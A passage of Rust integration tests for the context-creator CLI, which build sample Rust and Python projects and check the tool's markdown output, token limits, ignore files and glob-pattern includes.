        assert_eq!(response.data.unwrap().len(), 10);
    }
    
    #[test]
    fn test_list_products_custom() {
        let request = ListRequest { page: Some(2), limit: Some(5) };
        let response = list_products(request);
        assert!(response.success);
        let products = response.data.unwrap();
        assert_eq!(products.len(), 5);
        assert_eq!(products[0].id, 6); // Second page, first item
    }
}
"#,
    )
    .unwrap();

    fs::create_dir_all(project_dir.join("src/models")).unwrap();
    fs::write(
        project_dir.join("src/models/mod.rs"),
        r#"
//! Data models

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Product {
    pub id: u32,
    pub name: String,
    pub price: f64,
    pub description: String,
}

impl Product {
    pub fn new(id: u32, name: String, price: f64, description: String) -> Self {
        Self { id, name, price, description }
    }
    
    pub fn formatted_price(&self) -> String {
        format!("${:.2}", self.price)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_product_creation() {
        let product = Product::new(
            1,
            "Test Product".to_string(),
            19.99,
            "A test product".to_string(),
        );
        assert_eq!(product.id, 1);
        assert_eq!(product.name, "Test Product");
    }
    
    #[test]
    fn test_formatted_price() {
        let product = Product::new(1, "Test".to_string(), 19.99, "Test".to_string());
        assert_eq!(product.formatted_price(), "$19.99");
    }
}
"#,
    )
    .unwrap();

    fs::create_dir_all(project_dir.join("src/utils")).unwrap();
    fs::write(
        project_dir.join("src/utils/mod.rs"),
        r#"
//! Utility functions

use std::collections::HashMap;

pub fn slugify(input: &str) -> String {
    input
        .to_lowercase()
        .chars()
        .map(|c| if c.is_alphanumeric() { c } else { '-' })
        .collect::<String>()
        .split('-')
        .filter(|s| !s.is_empty())
        .collect::<Vec<_>>()
        .join("-")
}

pub fn parse_query_params(query: &str) -> HashMap<String, String> {
    query
        .split('&')
        .filter_map(|pair| {
            let mut split = pair.split('=');
            match (split.next(), split.next()) {
                (Some(key), Some(value)) => Some((key.to_string(), value.to_string())),
                _ => None,
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_slugify() {
        assert_eq!(slugify("Hello World!"), "hello-world");
        assert_eq!(slugify("This is a Test"), "this-is-a-test");
        assert_eq!(slugify("NoSpaces"), "nospaces");
    }
    
    #[test]
    fn test_parse_query_params() {
        let params = parse_query_params("name=John&age=30&city=NYC");
        assert_eq!(params.len(), 3);
        assert_eq!(params.get("name"), Some(&"John".to_string()));
        assert_eq!(params.get("age"), Some(&"30".to_string()));
    }
}
"#,
    )
    .unwrap();

    // Create tests directory
    fs::create_dir_all(project_dir.join("tests")).unwrap();
    fs::write(
        project_dir.join("tests/integration_test.rs"),
        r#"
//! Integration tests

use example_project::Database;

#[test]
fn test_database_integration() {
    let mut db = Database::new();
    assert!(db.connect("test", "sqlite::memory:").is_ok());
    
    let results = db.execute_query("SELECT * FROM users").unwrap();
    assert!(!results.is_empty());
}
"#,
    )
    .unwrap();

    // Create README and other files
    fs::write(
        project_dir.join("README.md"),
        r#"
# Example Project

This is an example Rust project for testing context-creator functionality.

## Features

- Async web server with Tokio
- Database abstraction layer
- Authentication system
- REST API endpoints
- Comprehensive test coverage

## Usage

```bash
cargo run
```

## Testing

```bash
cargo test
```

## Building

```bash
cargo build --release
```
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join(".gitignore"),
        r#"
/target/
**/*.rs.bk
*.pdb
.DS_Store
*.log
"#,
    )
    .unwrap();

    // Create a config file
    fs::write(
        project_dir.join("config.toml"),
        r#"
[database]
url = "postgresql://localhost/example"
max_connections = 10

[server]
host = "0.0.0.0"
port = 8080
workers = 4

[logging]
level = "info"
file = "app.log"
"#,
    )
    .unwrap();

    project_dir
}

/// Create a Python project for testing multi-language support
fn create_python_project(temp_dir: &Path) -> std::path::PathBuf {
    let project_dir = temp_dir.join("python_project");
    fs::create_dir_all(&project_dir).unwrap();

    // Create setup.py
    fs::write(
        project_dir.join("setup.py"),
        r#"
from setuptools import setup, find_packages

setup(
    name="example-python-project",
    version="0.1.0",
    packages=find_packages(),
    install_requires=[
        "requests>=2.25.0",
        "click>=7.0",
        "pydantic>=1.8.0",
    ],
    entry_points={
        "console_scripts": [
            "example=example.cli:main",
        ],
    },
)
"#,
    )
    .unwrap();

    // Create package structure
    fs::create_dir_all(project_dir.join("example")).unwrap();
    fs::write(
        project_dir.join("example/__init__.py"),
        r#"
"""Example Python package for testing context-creator."""

__version__ = "0.1.0"
__author__ = "Test Author"

from .core import process_data, DataProcessor
from .utils import slugify, parse_config

__all__ = ["process_data", "DataProcessor", "slugify", "parse_config"]
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("example/core.py"),
        r#"
"""Core functionality for the example package."""

import json
from typing import Dict, List, Optional
from dataclasses import dataclass


@dataclass
class DataProcessor:
    """Process data with various transformations."""
    
    name: str
    config: Dict[str, str]
    
    def process(self, data: List[Dict]) -> List[Dict]:
        """Process a list of data items."""
        processed = []
        
        for item in data:
            processed_item = self._transform_item(item)
            if self._validate_item(processed_item):
                processed.append(processed_item)
                
        return processed
    
    def _transform_item(self, item: Dict) -> Dict:
        """Transform a single data item."""
        transformed = item.copy()
        
        # Apply transformations based on config
        if "lowercase_names" in self.config:
            if "name" in transformed:
                transformed["name"] = transformed["name"].lower()
                
        if "add_timestamp" in self.config:
            import time
            transformed["processed_at"] = time.time()
            
        return transformed
    
    def _validate_item(self, item: Dict) -> bool:
        """Validate a processed item."""
        required_fields = self.config.get("required_fields", "").split(",")
        
        for field in required_fields:
            field = field.strip()
            if field and field not in item:
                return False
                
        return True


def process_data(data: List[Dict], processor_name: str = "default") -> List[Dict]:
    """Process data using the default processor."""
    config = {
        "lowercase_names": "true",
        "add_timestamp": "true",
        "required_fields": "name,id"
    }
    
    processor = DataProcessor(processor_name, config)
    return processor.process(data)


def load_config(config_path: str) -> Dict:
    """Load configuration from a file."""
    try:
        with open(config_path, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("example/utils.py"),
        r#"
"""Utility functions for the example package."""

import re
from typing import Dict, Any


def slugify(text: str) -> str:
    """Convert text to URL-friendly slug."""
    # Convert to lowercase and replace spaces/special chars with hyphens
    slug = re.sub(r'[^\w\s-]', '', text.lower())
    slug = re.sub(r'[-\s]+', '-', slug)
    return slug.strip('-')


def parse_config(config_str: str) -> Dict[str, Any]:
    """Parse configuration string into dictionary."""
    config = {}
    
    for line in config_str.strip().split('\n'):
        line = line.strip()
        if '=' in line and not line.startswith('#'):
            key, value = line.split('=', 1)
            key = key.strip()
            value = value.strip()
            
            # Try to convert to appropriate type
            if value.lower() in ('true', 'false'):
                config[key] = value.lower() == 'true'
            elif value.isdigit():
                config[key] = int(value)
            else:
                config[key] = value
                
    return config


def format_response(data: Any, status: str = "success") -> Dict:
    """Format API response in standard format."""
    return {
        "status": status,
        "data": data,
        "timestamp": __import__("time").time()
    }
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("example/cli.py"),
        r#"
"""Command-line interface for the example package."""

import click
import json
from .core import process_data, load_config
from .utils import slugify, parse_config


@click.group()
@click.version_option()
def main():
    """Example CLI application."""
    pass


@main.command()
@click.argument('input_file', type=click.File('r'))
@click.option('--output', '-o', type=click.File('w'), default='-')
@click.option('--processor', '-p', default='default', help='Processor name')
def process(input_file, output, processor):
    """Process data from input file."""
    try:
        data = json.load(input_file)
        processed = process_data(data, processor)
        json.dump(processed, output, indent=2)
        click.echo(f"Processed {len(processed)} items", err=True)
    except Exception as e:
        click.echo(f"Error: {e}", err=True)
        raise click.Abort()


@main.command()
@click.argument('text')
def slug(text):
    """Convert text to URL slug."""
    click.echo(slugify(text))


if __name__ == '__main__':
    main()
"#,
    )
    .unwrap();

    // Create tests
    fs::create_dir_all(project_dir.join("tests")).unwrap();
    fs::write(
        project_dir.join("tests/test_core.py"),
        r#"
"""Tests for core functionality."""

import pytest
from example.core import DataProcessor, process_data


def test_data_processor_creation():
    """Test DataProcessor creation."""
    processor = DataProcessor("test", {"setting": "value"})
    assert processor.name == "test"
    assert processor.config["setting"] == "value"


def test_process_data():
    """Test process_data function."""
    data = [
        {"id": 1, "name": "Test Item"},
        {"id": 2, "name": "Another Item"}
    ]
    
    result = process_data(data)
    assert len(result) == 2
    assert result[0]["name"] == "test item"  # Should be lowercase
    assert "processed_at" in result[0]


def test_validation():
    """Test item validation."""
    processor = DataProcessor("test", {"required_fields": "id,name"})
    
    valid_item = {"id": 1, "name": "Test"}
    invalid_item = {"id": 1}  # Missing name
    
    assert processor._validate_item(valid_item) is True
    assert processor._validate_item(invalid_item) is False
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("tests/test_utils.py"),
        r#"
"""Tests for utility functions."""

import pytest
from example.utils import slugify, parse_config, format_response


def test_slugify():
    """Test slugify function."""
    assert slugify("Hello World!") == "hello-world"
    assert slugify("This is a Test") == "this-is-a-test"
    assert slugify("NoSpaces") == "nospaces"


def test_parse_config():
    """Test parse_config function."""
    config_str = """
    name=Test App
    debug=true
    port=8080
    # This is a comment
    """
    
    config = parse_config(config_str)
    assert config["name"] == "Test App"
    assert config["debug"] is True
    assert config["port"] == 8080


def test_format_response():
    """Test format_response function."""
    response = format_response({"key": "value"})
    assert response["status"] == "success"
    assert response["data"]["key"] == "value"
    assert "timestamp" in response
"#,
    )
    .unwrap();

    fs::write(
        project_dir.join("README.md"),
        r#"
# Example Python Project

A Python package for testing context-creator functionality.

## Installation

```bash
pip install -e .
```

## Usage

```python
from example import process_data, slugify

data = [{"id": 1, "name": "Test"}]
processed = process_data(data)
print(processed)
```

## CLI

```bash
example process data.json
example slug "Hello World"
```
"#,
    )
    .unwrap();

    project_dir
}

/// Test basic end-to-end markdown generation
#[test]
fn test_e2e_basic_markdown_generation() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = create_realistic_rust_project(temp_dir.path());
    let output_file = temp_dir.path().join("output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--progress");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Scanning directory"))
        .stderr(predicate::str::contains("Found"))
        .stderr(predicate::str::contains("files"))
        .stdout(predicate::str::contains("Written to"));

    // Verify output file was created and has expected structure
    assert!(output_file.exists());
    let content = fs::read_to_string(&output_file).unwrap();

    // Should contain basic structure
    assert!(content.contains("# Code Context"));
    assert!(content.contains("## Statistics"));
    assert!(content.contains("## File Structure"));
    assert!(content.contains("## Table of Contents"));

    // Should contain specific files from our realistic project
    assert!(content.contains("Cargo.toml"));
    assert!(contains_path(&content, "src/main.rs"));
    assert!(contains_path(&content, "src/lib.rs"));
    assert!(contains_path(&content, "src/handlers/auth.rs"));
    assert!(content.contains("README.md"));

    // Should contain actual code content
    assert!(content.contains("tokio::main"));
    assert!(
        content.contains("Database") || content.contains("Config") || content.contains("serde")
    );
    assert!(content.contains("Deserialize") || content.contains("Serialize"));

    // Check that it's properly formatted markdown
    assert!(content.contains("```rust"));
    assert!(content.contains("```toml"));
    assert!(content.contains("```markdown"));
}

/// Test end-to-end with token limits and prioritization
#[test]
fn test_e2e_with_token_limits() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = create_realistic_rust_project(temp_dir.path());
    let output_file = temp_dir.path().join("limited_output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--max-tokens")
        .arg("5000") // Small limit to force prioritization
        .arg("--verbose");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Token limit"))
        .stderr(predicate::str::contains("Selected"))
        .stderr(predicate::str::contains("Structure overhead"));

    assert!(output_file.exists());
    let content = fs::read_to_string(&output_file).unwrap();

    // Should still have basic structure but fewer files
    assert!(content.contains("# Code Context"));
    assert!(content.contains("## Statistics"));

    // Should prioritize important files (main.rs, lib.rs, Cargo.toml)
    assert!(contains_path(&content, "src/main.rs") || content.contains("Cargo.toml"));
}

/// Test end-to-end with configuration file
#[test]
fn test_e2e_with_config_file() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = create_realistic_rust_project(temp_dir.path());

    // Create a configuration file
    let config_content = r#"
ignore = ["tests/*.rs", "*.log"]

[defaults]
max_tokens = 15000
progress = true
verbose = true

[[priorities]]
pattern = "src/main.rs"
weight = 200.0

[[priorities]]
pattern = "*.toml"
weight = 150.0
"#;

    let config_file = temp_dir.path().join("context-config.toml");
    fs::write(&config_file, config_content).unwrap();

    let output_file = temp_dir.path().join("config_output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("-c")
        .arg(&config_file);

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Loaded configuration"));

    assert!(output_file.exists());
    let content = fs::read_to_string(&output_file).unwrap();

    // Should contain prioritized files
    assert!(contains_path(&content, "src/main.rs"));
    assert!(content.contains("Cargo.toml"));

    // Should exclude ignored test files (if token limit allows, they should be deprioritized)
    // Note: This is harder to test directly since it depends on token limits and file sizes
}

/// Test end-to-end with multi-language project
#[test]
fn test_e2e_multi_language_project() {
    let temp_dir = TempDir::new().unwrap();
    let rust_dir = create_realistic_rust_project(temp_dir.path());
    let python_dir = create_python_project(temp_dir.path());

    // Create a mixed project by copying Python files into Rust project
    let mixed_dir = temp_dir.path().join("mixed_project");
    fs::create_dir_all(&mixed_dir).unwrap();

    // Helper function to copy directories recursively
    fn copy_dir(src: &Path, dst: &Path) {
        if src.is_dir() {
            fs::create_dir_all(dst).unwrap();
            for entry in fs::read_dir(src).unwrap() {
                let entry = entry.unwrap();
                let src_path = entry.path();
                let dst_path = dst.join(entry.file_name());
                copy_dir(&src_path, &dst_path);
            }
        } else {
            if let Some(parent) = dst.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::copy(src, dst).unwrap();
        }
    }

    copy_dir(&rust_dir, &mixed_dir);

    // Add Python files
    let python_target = mixed_dir.join("python");
    copy_dir(&python_dir, &python_target);

    let output_file = temp_dir.path().join("mixed_output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&mixed_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--progress");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Scanning directory"))
        .stderr(predicate::str::contains("Found"));

    assert!(output_file.exists());
    let content = fs::read_to_string(&output_file).unwrap();

    // Should contain both languages
    assert!(content.contains("```rust"));
    assert!(content.contains("```python"));
    assert!(content.contains("```toml"));

    // Should contain files from both projects
    assert!(content.contains("Cargo.toml"));
    assert!(content.contains("setup.py"));
    assert!(content.contains("tokio::main"));
    assert!(content.contains("def process_data"));
}

/// Test end-to-end error handling scenarios
#[test]
fn test_e2e_error_handling() {
    // Test with non-existent directory
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("/nonexistent/directory/path");

    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("Directory does not exist"));

    // Test with invalid output directory
    let temp_dir = TempDir::new().unwrap();
    let project_dir = create_realistic_rust_project(temp_dir.path());

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg("/nonexistent/path/output.md");

    cmd.assert()
        .failure()
        .stderr(predicate::str::contains("Output directory does not exist"));
}

/// Test end-to-end with large project (performance test)
#[test]
fn test_e2e_large_project_performance() {
    let temp_dir = TempDir::new().unwrap();
    let large_project = temp_dir.path().join("large_project");
    fs::create_dir_all(&large_project).unwrap();

    // Create many files to test performance
    fs::create_dir_all(large_project.join("src")).unwrap();
    for i in 0..50 {
        let content = format!(
            r#"
// Module {i}
use std::collections::HashMap;

pub struct Module{i} {{
    data: HashMap<String, String>,
}}

impl Module{i} {{
    pub fn new() -> Self {{
        Self {{
            data: HashMap::new(),
        }}
    }}
    
    pub fn process(&self, input: &str) -> String {{
        format!("Processed: {{}}", input)
    }}
}}

#[cfg(test)]
mod tests {{
    use super::*;
    
    #[test]
    fn test_module{i}() {{
        let module = Module{i}::new();
        assert_eq!(module.process("test"), "Processed: test");
    }}
}}
"#
        );

        fs::write(large_project.join(format!("src/module_{i}.rs")), content).unwrap();
    }

    // Create a Cargo.toml for the large project
    fs::write(
        large_project.join("Cargo.toml"),
        r#"
[package]
name = "large-project"
version = "0.1.0"
edition = "2021"
"#,
    )
    .unwrap();

    let output_file = temp_dir.path().join("large_output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&large_project)
        .arg("-o")
        .arg(&output_file)
        .arg("--max-tokens")
        .arg("100000")
        .arg("--progress");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Scanning directory"))
        .stderr(predicate::str::contains("Found"));

    assert!(output_file.exists());
    let content = fs::read_to_string(&output_file).unwrap();

    // Should have processed the large project efficiently
    assert!(content.contains("# Code Context"));
    assert!(content.contains("## Statistics"));

    // Should contain some of the generated modules
    assert!(content.contains("module_") || content.contains("Module"));
}

/// Test end-to-end stdout output (no file output)
#[test]
fn test_e2e_stdout_output() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = create_realistic_rust_project(temp_dir.path());

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("--max-tokens")
        .arg("10000")
        .arg("--quiet"); // Suppress progress output to avoid contaminating stdout

    let output = cmd.assert().success().get_output().stdout.clone();
    let output_str = String::from_utf8(output).unwrap();

    assert!(output_str.contains("# Code Context"));
    assert!(contains_path(&output_str, "src/main.rs"));
    assert!(output_str.contains("```rust"));
}

/// Test end-to-end with contextignore file
#[test]
fn test_e2e_with_contextignore() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = create_realistic_rust_project(temp_dir.path());

    // Create .context-creator-ignore file
    fs::write(
        project_dir.join(".context-creator-ignore"),
        r#"
tests/
*.log
target/
.git/
src/handlers/
"#,
    )
    .unwrap();

    let output_file = temp_dir.path().join("ignored_output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--verbose");

    cmd.assert().success();

    assert!(output_file.exists());
    let content = fs::read_to_string(&output_file).unwrap();

    // Should contain main files
    assert!(contains_path(&content, "src/main.rs"));
    assert!(contains_path(&content, "src/lib.rs"));
    assert!(content.contains("Cargo.toml"));

    // Should NOT contain ignored files/directories
    assert!(!contains_path(&content, "tests/integration_test.rs"));
    assert!(!contains_path(&content, "src/handlers/auth.rs"));
}

/// Test end-to-end verbose output for debugging
#[test]
fn test_e2e_verbose_debugging() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = create_realistic_rust_project(temp_dir.path());
    let output_file = temp_dir.path().join("verbose_output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--verbose")
        .arg("--progress");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Starting context-creator"))
        .stderr(predicate::str::contains("Directories:"))
        .stderr(predicate::str::contains("Creating directory walker"))
        .stderr(predicate::str::contains(
            "Creating context generation options",
        ))
        .stderr(predicate::str::contains("File list:"))
        .stderr(predicate::str::contains("Scanning directory"))
        .stderr(predicate::str::contains("Generating markdown"));

    assert!(output_file.exists());
}

/// Test end-to-end with different LLM tool options (without actually calling them)
#[test]
fn test_e2e_llm_tool_selection() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = create_realistic_rust_project(temp_dir.path());
    let output_file = temp_dir.path().join("tool_output.md");

    // Test with gemini
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--tool")
        .arg("gemini")
        .arg("--verbose");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("LLM tool: gemini"));

    // Test with codex
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&project_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--tool")
        .arg("codex")
        .arg("--verbose");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("LLM tool: codex"));
}

/// Test end-to-end with multiple directories
#[test]
fn test_e2e_multiple_directories() {
    let temp_dir = TempDir::new().unwrap();

    // Create separate Rust and Python projects
    let rust_dir = create_realistic_rust_project(temp_dir.path());
    let python_dir = create_python_project(temp_dir.path());

    let output_file = temp_dir.path().join("multiple_dirs_output.md");

    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg(&rust_dir)
        .arg(&python_dir)
        .arg("-o")
        .arg(&output_file)
        .arg("--progress");

    cmd.assert()
        .success()
        .stderr(predicate::str::contains("Processing directory 1 of 2"))
        .stderr(predicate::str::contains("Processing directory 2 of 2"));

    assert!(output_file.exists());
    let content = fs::read_to_string(&output_file).unwrap();

    // Should contain header indicating multiple directories
    assert!(content.contains("# Code Context - Multiple Directories"));

    // Should contain separate sections for each directory
    assert!(content.contains(&format!("## Directory: {}", rust_dir.display())));
    assert!(content.contains(&format!("## Directory: {}", python_dir.display())));

    // Should contain content from both projects
    assert!(content.contains("Cargo.toml"));
    assert!(content.contains("setup.py"));
    assert!(content.contains("```rust"));
    assert!(content.contains("```python"));
    assert!(content.contains("tokio::main"));
    assert!(content.contains("def process_data"));
}
```

## tests/glob_pattern_test.rs

Imports: assert_cmd::Command, predicates::prelude::*, std, tempfile::TempDir, glob_pattern_integration_tests, super::*, edge_case_tests

Type references: assert_cmd::Command.Command, tempfile::TempDir.TempDir

```rust
//! Integration tests for glob pattern support in --include flag

use assert_cmd::Command;
use predicates::prelude::*;
use std::fs::{self, File};
use tempfile::TempDir;

/// Helper function to check if content contains a path, handling both Unix and Windows separators
fn contains_path(content: &str, path: &str) -> bool {
    let unix_path = path.replace('\\', "/");
    let windows_path = path.replace('/', "\\");
    content.contains(&unix_path) || content.contains(&windows_path)
}

/// Test that all test scenarios from GitHub issue #16 work correctly
mod glob_pattern_integration_tests {
    use super::*;

    #[test]
    fn test_simple_wildcard_patterns() {
        // Test scenario: context-creator --include "*.py" --prompt "analyze Python files"
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create test files with actual content
        fs::write(root.join("main.py"), "print('Hello from main')\\n").unwrap();
        fs::write(root.join("utils.py"), "def helper(): pass\\n").unwrap();
        fs::write(root.join("README.md"), "# Test Project\\n").unwrap();
        fs::write(root.join("config.toml"), "[test]\\nvalue = 1\\n").unwrap();

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("--include")
            .arg("*.py")
            .arg("--output-file")
            .arg("output.md");

        // Run command and capture output for debugging
        let output = cmd.output().unwrap();
        if !output.status.success() {
            panic!(
                "Command failed with stderr: {}",
                String::from_utf8_lossy(&output.stderr)
            );
        }

        // Ensure output file exists before reading
        assert!(
            root.join("output.md").exists(),
            "Output file was not created"
        );

        // Check that output file was created and contains only Python files
        let output_content = fs::read_to_string(root.join("output.md")).unwrap();
        assert!(contains_path(&output_content, "main.py"));
        assert!(contains_path(&output_content, "utils.py"));
        assert!(!contains_path(&output_content, "README.md"));
        assert!(!contains_path(&output_content, "config.toml"));
    }

    #[test]
    fn test_recursive_directory_matching() {
        // Test scenario: context-creator --include "**/*.rs" --prompt "analyze Rust code"
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create nested structure
        fs::create_dir_all(root.join("src/core")).unwrap();
        fs::create_dir_all(root.join("tests")).unwrap();
        File::create(root.join("main.rs")).unwrap();
        File::create(root.join("src/lib.rs")).unwrap();
        File::create(root.join("src/core/mod.rs")).unwrap();
        File::create(root.join("tests/test.rs")).unwrap();
        File::create(root.join("README.md")).unwrap();

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("--include")
            .arg("**/*.rs")
            .arg("--output-file")
            .arg("output.md");

        cmd.assert().success();

        // Check that output contains all Rust files recursively
        let output_content = fs::read_to_string(root.join("output.md")).unwrap();
        assert!(contains_path(&output_content, "main.rs"));
        assert!(contains_path(&output_content, "src/lib.rs"));
        assert!(contains_path(&output_content, "src/core/mod.rs"));
        assert!(contains_path(&output_content, "tests/test.rs"));
        assert!(!contains_path(&output_content, "README.md"));
    }

    #[test]
    fn test_brace_expansion() {
        // Test scenario: context-creator --include "src/**/*.{py,js}" --prompt "analyze source files"
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create test files
        fs::create_dir_all(root.join("src/api")).unwrap();
        fs::create_dir_all(root.join("tests")).unwrap();
        File::create(root.join("src/main.py")).unwrap();
        File::create(root.join("src/app.js")).unwrap();
        File::create(root.join("src/api/handler.py")).unwrap();
        File::create(root.join("src/api/client.js")).unwrap();
        File::create(root.join("tests/test.py")).unwrap(); // Should not match
        File::create(root.join("src/config.toml")).unwrap(); // Should not match

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("--include")
            .arg("src/**/*.{py,js}")
            .arg("--output-file")
            .arg("output.md");

        cmd.assert().success();

        // Check that output contains only Python and JavaScript files in src/
        let output_content = fs::read_to_string(root.join("output.md")).unwrap();
        assert!(contains_path(&output_content, "src/main.py"));
        assert!(contains_path(&output_content, "src/app.js"));
        assert!(contains_path(&output_content, "src/api/handler.py"));
        assert!(contains_path(&output_content, "src/api/client.js"));
        assert!(!contains_path(&output_content, "tests/test.py"));
        assert!(!contains_path(&output_content, "src/config.toml"));
    }

    #[test]
    fn test_character_sets_and_ranges() {
        // Test scenario: context-creator --include "**/test[0-9].py" --prompt "analyze test files"
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create test files
        fs::create_dir_all(root.join("tests")).unwrap();
        File::create(root.join("test1.py")).unwrap();
        File::create(root.join("test2.py")).unwrap();
        File::create(root.join("test9.py")).unwrap();
        File::create(root.join("tests/test3.py")).unwrap();
        File::create(root.join("test.py")).unwrap(); // Should not match
        File::create(root.join("test10.py")).unwrap(); // Should not match
        File::create(root.join("testA.py")).unwrap(); // Should not match

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("--include")
            .arg("**/test[0-9].py")
            .arg("--output-file")
            .arg("output.md");

        cmd.assert().success();

        // Check that output contains only numbered test files
        let output_content = fs::read_to_string(root.join("output.md")).unwrap();
        assert!(contains_path(&output_content, "test1.py"));
        assert!(contains_path(&output_content, "test2.py"));
        assert!(contains_path(&output_content, "test9.py"));
        assert!(contains_path(&output_content, "tests/test3.py"));
        assert!(!contains_path(&output_content, "test.py"));
        assert!(!contains_path(&output_content, "test10.py"));
        assert!(!contains_path(&output_content, "testA.py"));
    }

    #[test]
    fn test_complex_pattern_combinations() {
        // Test scenario: context-creator --include "**/*{repository,service,model}*.py" --include "**/db/**"
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        // Create test files
        fs::create_dir_all(root.join("src/db/models")).unwrap();
        fs::create_dir_all(root.join("src/api")).unwrap();
        fs::create_dir_all(root.join("db/migrations")).unwrap();

        File::create(root.join("src/user_repository.py")).unwrap();
        File::create(root.join("src/api/auth_service.py")).unwrap();
        File::create(root.join("src/user_model.py")).unwrap();
        File::create(root.join("src/db/models/base.py")).unwrap();
        File::create(root.join("src/db/connection.py")).unwrap();
        File::create(root.join("db/migrations/001.sql")).unwrap();
        File::create(root.join("src/utils.py")).unwrap(); // Should not match first pattern
        File::create(root.join("src/config.py")).unwrap(); // Should not match first pattern

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("--include")
            .arg("**/*{repository,service,model}*.py")
            .arg("--include")
            .arg("**/db/**")
            .arg("--output-file")
            .arg("output.md");

        cmd.assert().success();

        // Check that output contains files matching either pattern
        let output_content = fs::read_to_string(root.join("output.md")).unwrap();

        // Files matching first pattern (repository, service, model)
        assert!(contains_path(&output_content, "src/user_repository.py"));
        assert!(contains_path(&output_content, "src/api/auth_service.py"));
        assert!(contains_path(&output_content, "src/user_model.py"));

        // Files matching second pattern (**/db/**)
        assert!(contains_path(&output_content, "src/db/models/base.py"));
        assert!(contains_path(&output_content, "src/db/connection.py"));
        assert!(contains_path(&output_content, "db/migrations/001.sql"));

        // Files that should not match
        assert!(!contains_path(&output_content, "src/utils.py"));
        assert!(!contains_path(&output_content, "src/config.py"));
    }

    #[test]
    fn test_invalid_glob_pattern_error() {
        // Test scenario: context-creator --include "src/[" --prompt "test"
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("--include")
            .arg("src/[") // Invalid pattern - unclosed bracket
            .arg("--output-file")
            .arg("output.md");

        cmd.assert()
            .failure()
            .stderr(predicate::str::contains("Invalid include pattern"));
    }

    #[test]
    fn test_empty_pattern_handling() {
        // Test that empty patterns are handled gracefully
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        File::create(root.join("test.py")).unwrap();

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
            .arg("--include")
            .arg("") // Empty pattern
            .arg("--include")
            .arg("*.py") // Valid pattern
            .arg("--output-file")
            .arg("output.md");

        cmd.assert().success();

        // Should include the Python file despite empty pattern
        let output_content = fs::read_to_string(root.join("output.md")).unwrap();
        assert!(contains_path(&output_content, "test.py"));
    }

    #[test]
    fn test_multiple_include_patterns() {
        // Test multiple --include flags work additively
        let temp_dir = TempDir::new().unwrap();
        let root = temp_dir.path();

        File::create(root.join("main.py")).unwrap();
        File::create(root.join("app.js")).unwrap();
        File::create(root.join("config.rs")).unwrap();
        File::create(root.join("README.md")).unwrap();

        let mut cmd = Command::cargo_bin("context-creator").unwrap();
        cmd.current_dir(root)
